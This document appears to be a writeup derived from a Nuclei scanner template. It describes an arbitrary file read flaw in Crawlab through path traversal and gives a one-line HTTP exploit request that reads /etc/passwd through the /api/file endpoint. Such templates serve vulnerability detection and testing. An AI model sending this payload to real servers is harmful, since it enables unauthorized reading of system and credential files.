# Nuclei Template: Crawlab - Arbitrary File Read
**Template ID:** crawlab-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`crawlab-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Crawlab is vulnerable to arbitrary file read.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api/file?path=../../etc/passwd
```

## References
- https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Crawlab%20file%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
